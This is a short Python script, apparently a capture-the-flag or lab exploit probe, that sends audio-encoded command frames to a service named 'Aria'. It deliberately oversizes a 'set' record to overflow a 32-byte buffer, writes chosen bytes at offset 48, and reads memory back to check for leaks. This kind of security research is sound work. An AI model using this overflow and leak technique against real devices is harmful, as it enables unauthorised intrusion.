import sys
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import enc, client

RAMP = bytes(range(32))


def mk(payload):
    """Frame A5 5A LEN payload CKSUM, may bang dog-whistle."""
    return enc.capture(payload)


def rec_select():
    return bytes([0x01, 0x01, 0x0E])


def rec_set(count, data):
    assert len(data) == 2 * count, (len(data), 2 * count)
    return bytes([0x02, 1 + 2 * count, count]) + data


def show(a, name, payload):
    wav, fr = mk(payload)
    print("== %-26s frame=%s %.2fs" % (name, fr.hex(), (len(wav) - 44) / 3 / 96000))
    print(a.send_line(wav).decode(errors="replace").strip())


a = client.Aria()
a.hello()
show(a, "select (baseline leak)", rec_select())
show(a, "set 32B ramp @A", rec_set(16, RAMP))
show(a, "select (read back A)", rec_select())
d = bytearray(50)
d[48] = 0xA0
d[49] = 0x26
show(a, "set 50B, +48=a0 26", rec_set(25, bytes(d)))
show(a, "select after overflow", rec_select())
a.close()
